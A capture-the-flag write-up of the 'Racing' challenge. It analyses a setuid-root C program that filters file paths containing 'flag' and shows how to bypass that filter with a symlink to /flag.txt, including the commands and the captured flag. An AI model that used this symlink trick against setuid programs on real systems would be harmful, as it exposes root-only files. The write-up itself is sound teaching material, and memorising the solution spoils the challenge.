# Racing (100)

## CTFd Entry

Cars 1 is my favorite movie, what's yours?

`ssh user@34.148.242.227 -p 2222. The password is racing-chals.`

Author: atom

## Attachments

[chal.c](./chal.c)

## Writeup

Note: Since the CTF infrastructure is down, I will self-host the challenge using the provided source code. The challenge will be hosted on a locally defined host `racing.chal` instead of the specified IP.

### Enumerating SSH access

You are provided SSH access to an Ubuntu instance that contains two unexpected files in the root directory. These files are:

- challenge/
- flag.txt

```bash
user@13ce3628d603:/$ ls -l
total 76
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
drwxr-xr-x   1 root root 4096 Jan 20 12:12 challenge
drwxr-xr-x   5 root root  340 Jan 20 12:16 dev
drwxr-xr-x   1 root root 4096 Jan 20 12:16 etc
-r--------   1 root root   34 Jan 15 09:26 flag.txt
drwxr-xr-x   1 root root 4096 Jan 20 12:12 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4096 Jul  1  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Nov 19 09:46 media
drwxr-xr-x   2 root root 4096 Nov 19 09:46 mnt
drwxr-xr-x   2 root root 4096 Nov 19 09:46 opt
dr-xr-xr-x 413 root root    0 Jan 20 12:16 proc
drwx------   1 root root 4096 Jan 20 12:12 root
drwxr-xr-x   1 root root 4096 Jan 20 12:17 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Nov 19 09:46 srv
dr-xr-xr-x  13 root root    0 Jan 20 12:17 sys
drwxrwxrwt   1 root root 4096 Jan 20 12:12 tmp
drwxr-xr-x   1 root root 4096 Nov 19 09:46 usr
drwxr-xr-x   1 root root 4096 Nov 19 09:52 var
```

The `flag.txt` is owned by root and can only be read by the owner of the file. Since the `challenge` folder does not exist in a default installation of Ubuntu, I was immediately interested in the contents of this folder.

The contents of the folder contains a binary called `chal` with a SetUID bit. As the binary is owned by root, this means that when the binary is executed by any user, it will be executed as the root user. This is because the SetUID permission executes the binary as the owner of the file. This is a well-known feature and is only a security concern depending on the functionality of the binary. 

```bash
-rwsr-xr-x 1 root root 16480 Jan 20 12:12 chal
```

Fortunately, we are provided the source code of the `chal` binary as apart of the attachments of the challenge named `chal.c`.

### Source Code Analysis

The source code is quite simple and I will step through each section of the code and give a brief description of what it does. You can use AI tools to describe this code quite accurately such as ChatGPT if you require more details.

Ensure that the UID is set to 0 which means that the owner of the binary must be root.

```c
    if (setuid(0) != 0)
    {
        perror("Error setting UID");
        return EXIT_FAILURE;
    }
```

The `fn` variable specifies a filepath, `buffer` is used to store the contents of a file that is read and `f` will contain a user-inputted string. The user-inputted string will be the path of a file that is read by the program and its contents stored in `buffer`.

```c
    char *fn = "/home/user/permitted";
    char buffer[128];
    char f[128];
    FILE *fp;
```

Check if filepath specified by the `fn` variable which is `/home/user/permitted` exists and is readable.

```c
if (!access(fn, R_OK))
```

Take user input to save in the variable `f` and removes any newlines characters.

```c
        printf("Enter file to read: ");
        fgets(f, sizeof(f), stdin);
        f[strcspn(f, "\n")] = 0;
```

Check if the inputted string contains the word `flag`. If it does, then the program will exit. This is an access control mechanism to prevent a user from reading the `flag.txt` file.

```c
        if (strstr(f, "flag") != NULL)
        {
            printf("Can't read the 'flag' file.\n");
            return 1;
        }
```

If the length of the inputted string is 0, it will open the file defined at `fn` which is `/home/user/permitted`. Otherwise, it will open the user-specified file.

```c
        if (strlen(f) == 0)
        {
            fp = fopen(fn, "r");
        }
        else
        {
            fp = fopen(f, "r");
        }
```

Read the contents into the variable `buffer` and output the contents onto the console. 

```c
        fread(buffer, sizeof(char), sizeof(buffer) - 1, fp);
        fclose(fp);
        printf("%s\n", buffer);
        return 0;
```

### Exploitation

The objective of this challenge is to read the `flag.txt` but we are under the restriction where the user-input to specify a file to read cannot contain the word `flag`. In order to bypass this, we can create a file that is a soft symlink (symbolic link) that points to the `flag.txt` file. This ensures that we can specify a filename that doesn't contain the word `flag` and read the contents of the linked file which will be `flag.txt`

The following command creates a symlink called `solopie` that points to the file `/flag.txt`:

```bash
user@13ce3628d603:~$ ln -s /flag.txt solopie
user@13ce3628d603:~$ ls -l
total 0
lrwxrwxrwx 1 user user 9 Jan 20 12:56 solopie -> /flag.txt
```

Now we can execute the binary and specify the file `solopie` to read `flag.txt`. However, first we need to ensure that the file `/home/user/permitted` exists due to the `access` function. We should get the contents of `flag.txt` outputted which is the flag.

```bash
user@13ce3628d603:~$ touch /home/user/permitted
user@13ce3628d603:~$ /challenge/chal
Enter file to read: solopie
uoftctf{r4c3_c0nd1t10n5_4r3_c00l}
```